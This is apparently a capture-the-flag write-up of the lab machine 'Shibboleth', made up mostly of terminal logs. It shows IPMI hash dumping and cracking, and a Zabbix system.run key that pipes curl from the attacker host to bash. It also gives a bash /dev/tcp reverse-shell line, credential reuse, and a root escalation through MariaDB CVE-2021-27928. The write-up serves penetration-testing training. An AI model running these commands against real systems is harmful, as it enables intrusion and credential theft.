```bash
ghost@localhost [22:13:48] [~/Documents/hacking/tj-null-boxes/shibboleth] [master]
-> % export IP=10.10.10.124

ghost@localhost [22:13:48] [~/Documents/hacking/tj-null-boxes/shibboleth] [master]
-> % export DOMAIN=shibboleth.htb
```

# Scan

```bash
ghost@localhost [22:14:27] [~/Documents/hacking/tj-null-boxes/shibboleth] [master]
-> % rustscan -a $IP -- -sC -sV
Open 10.10.11.124:80

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://shibboleth.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: shibboleth.htb
```

# Port 80 /

Gobuster result as below.
```bash
ghost@localhost [22:41:29] [~/Documents/hacking/tj-null-boxes/shibboleth] [master]
-> % gobuster dir -u http://$DOMAIN -k -w /usr/share/dirb/wordlists/common.txt
/.hta                 (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/assets               (Status: 301) [Size: 317] [--> http://shibboleth.htb/assets/]
/forms                (Status: 301) [Size: 316] [--> http://shibboleth.htb/forms/]
/index.html           (Status: 200) [Size: 59474]
/server-status        (Status: 403) [Size: 279]
```

The server contains nothing interesting in particular, contact form is not working either. Therefore, I start looking for subdomains instead.

```bash
ghost@localhost [22:55:45] [~/Documents/hacking/tj-null-boxes/shibboleth] [master]
-> % ffuf -u http://$DOMAIN -H 'Host: FUZZ.shibboleth.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 18
monitor                 [Status: 200, Size: 3689, Words: 192, Lines: 30, Duration: 614ms]
monitoring              [Status: 200, Size: 3689, Words: 192, Lines: 30, Duration: 410ms]
zabbix                  [Status: 200, Size: 3689, Words: 192, Lines: 30, Duration: 409ms]
```

## Zabbix

Default credentials does not work. Therefore, I scan UDP ports.

```bash
ghost@localhost [23:06:05] [~/Documents/hacking/tj-null-boxes/shibboleth] [master]
-> % sudo nmap -sU -v $IP --min-rate=500
Scanning shibboleth.htb (10.10.11.124) [1000 ports]
Discovered open port 623/udp on 10.10.11.124

623/udp   open   asf-rmcp
```

Search `asf-rmcp` vulnerability will shows this result (https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi) in Google that talks about IPMI protocol.

This blog (https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/) explains well about the IPMI protocol, and it's vulnerability. I am using metasploit to dump the password hashes.

```bash
[*] Starting persistent handler(s)...
msf6 >  search ipmi

Matching Modules
================

   #  Name                                                    Disclosure Date  Rank    Check  Description
   -  ----                                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/ipmi/ipmi_cipher_zero                 2013-06-20       normal  No     IPMI 2.0 Cipher Zero Authentication Bypass Scanner
   1  auxiliary/scanner/ipmi/ipmi_dumphashes                  2013-06-20       normal  No     IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval
   2  auxiliary/scanner/ipmi/ipmi_version                                      normal  No     IPMI Information Discovery
   3  exploit/multi/upnp/libupnp_ssdp_overflow                2013-01-29       normal  No     Portable UPnP SDK unique_service_name() Remote Code Execution
   4  auxiliary/scanner/http/smt_ipmi_cgi_scanner             2013-11-06       normal  No     Supermicro Onboard IPMI CGI Vulnerability Scanner
   5  auxiliary/scanner/http/smt_ipmi_49152_exposure          2014-06-19       normal  No     Supermicro Onboard IPMI Port 49152 Sensitive File Exposure
   6  auxiliary/scanner/http/smt_ipmi_static_cert_scanner     2013-11-06       normal  No     Supermicro Onboard IPMI Static SSL Certificate Scanner
   7  exploit/linux/http/smt_ipmi_close_window_bof            2013-11-06       good    Yes    Supermicro Onboard IPMI close_window.cgi Buffer Overflow
   8  auxiliary/scanner/http/smt_ipmi_url_redirect_traversal  2013-11-06       normal  No     Supermicro Onboard IPMI url_redirect.cgi Authenticated Directory Traversal


Interact with a module by name or index. For example info 8, use 8 or use auxiliary/scanner/http/smt_ipmi_url_redirect_traversal
```

Using the `ipmi_dumphashes` module, I dump the credential.

```bash
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set OUTPUT_HASHCAT_FILE /home/ghost/Downloads/ipmi.out
OUTPUT_HASHCAT_FILE => /home/ghost/Downloads/ipmi.out
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set RHOSTS 10.10.11.124
RHOSTS => 10.10.11.124
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:c0ed195a82010000886b5630d7d3da58517ca8aa8e593ebb726fa3c4905fba3cf5953f310750044ca123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:5d1f5d7bd0ff5bf341c60788a6f8612fb9cad3c9
```

Using `hashcat` I crack the password of the user `Administrator`.

```bash
ghost@localhost [23:27:25] [~/Documents/hacking/tj-null-boxes/shibboleth] [master *]
-> % hashcat hashes /usr/share/wordlists/rockyou.txt --username

c0ed195a82010000886b5630d7d3da58517ca8aa8e593ebb726fa3c4905fba3cf5953f310750044ca123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:5d1f5d7bd0ff5bf341c60788a6f8612fb9cad3c9:ilovepumkinpie1
```

## IPMI tool

```bash
ghost@localhost [23:34:35] [~/Documents/hacking/tj-null-boxes/shibboleth] [master *]
-> % ipmitool -H $IP -U Administrator -P ilovepumkinpie1 -I lanplus
No command provided!
```

Using the tool, there's nothing I can do. I tried to enumerate the users by entering `user list` and there's only an Administrator. Therefore, this time I tried to use the same credential on Zabbix login and it works.

I hosted the following `index.html` file that contains bash code and serve it with python server at port 80.

```bash
/bin/bash -c "bash -i >& /dev/tcp/10.10.16.8/4444 0>&1"
```

Then with netcat listening at port 4444, I created a new item in Zabbix with the following key.

```bash
system.run[curl 10.10.16.8|bash,nowait]
```

Click test and running it will gives back reverse shell.

```bash
ghost@localhost [23:41:20] [~/Documents/hacking/tj-null-boxes/shibboleth] [master *]
-> % nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.11.124] 48232
bash: cannot set terminal process group (954): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@shibboleth:/$ id
uid=110(zabbix) gid=118(zabbix) groups=118(zabbix)

zabbix@shibboleth:/$ ls /home
ipmi-svc
```

# user.txt

Using same credential, I tried logging into `ipmi-svc` and it works.

```bash
zabbix@shibboleth:/$ su ipmi-svc
Password: ilovepumkinpie1

python3 -c 'import pty;pty.spawn("/bin/bash")'

ipmi-svc@shibboleth:/$ cat ~/user.txt
df7f38***
```

# Privilege Escalation

Not much interesting things going on but I found the MySQL credential from linpeas result.

```bash
╔══════════╣ Analyzing Zabbix Files (limit 70)
-rw-r----- 1 root ipmi-svc 21863 Apr 24  2021 /etc/zabbix/zabbix_server.conf
LogFile=/var/log/zabbix/zabbix_server.log
LogFileSize=0
PidFile=/run/zabbix/zabbix_server.pid
SocketDir=/run/zabbix
DBName=zabbix
DBUser=zabbix
DBPassword=bloooarskybluh
SNMPTrapperFile=/var/log/snmptrap/snmptrap.log
Timeout=4
AlertScriptsPath=/usr/lib/zabbix/alertscripts
ExternalScripts=/usr/lib/zabbix/externalscripts
FpingLocation=/usr/bin/fping
Fping6Location=/usr/bin/fping6
LogSlowQueries=3000
StatsAllowedIP=127.0.0.1

-rw-r--r-- 1 root root 15317 May 25  2021 /etc/zabbix/zabbix_agentd.conf
PidFile=/run/zabbix/zabbix_agentd.pid
LogFile=/var/log/zabbix/zabbix_agentd.log
LogFileSize=0
AllowKey=system.run[*]
LogRemoteCommands=1
Server=127.0.0.1,shibboleth
StartAgents=100
ServerActive=127.0.0.1,shibboleth
Hostname=shibboleth.htb
RefreshActiveChecks=60
Include=/etc/zabbix/zabbix_agentd.d/*.conf
TLSConnect=psk
TLSAccept=psk
TLSPSKIdentity=e72cf455-9184-4d87-b377-75f3118f4141
TLSPSKFile=/etc/zabbix/peeesskay.psk

drwxr-xr-x 4 root root 4096 Nov  8  2021 /etc/zabbix
-r-------- 1 zabbix zabbix 33 Apr 24  2021 /etc/zabbix/peeesskay.psk

drwxr-xr-x 4 root root 4096 Apr 27  2021 /usr/lib/zabbix

drwxr-xr-x 13 root root 12288 Nov  8  2021 /usr/share/zabbix

drwx------ 2 mysql mysql 20480 Apr 27  2021 /var/lib/mysql/zabbix
find: ‘/var/lib/mysql/zabbix’: Permission denied

drwxr-xr-x 2 zabbix zabbix 4096 Sep 21 15:34 /var/log/zabbix
```

## mysql 10.3.25

So based on the result, I found that it is running MariaDB 10.3.25 which has CVE-2021-27928 vulnerability (https://github.com/Al1ex/CVE-2021-27928).

```bash
ipmi-svc@shibboleth:/$ mysql -u zabbix -p
mysql -u zabbix -p
Enter password: bloooarskybluh

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 1202
Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

So I first generate the shell script, then serve it with python server to download back in the Zabbix machine. Then with another netcat running, waiting for incoming connection.

```bash
MariaDB [(none)]> SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";
SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";
ERROR 2013 (HY000): Lost connection to MySQL server during query
MariaDB [(none)]>
```

```bash
ghost@localhost [00:25:07] [~/Documents/hacking/tj-null-boxes/shibboleth] [master *]
-> % nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.11.124] 40378
uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
bd312***
```
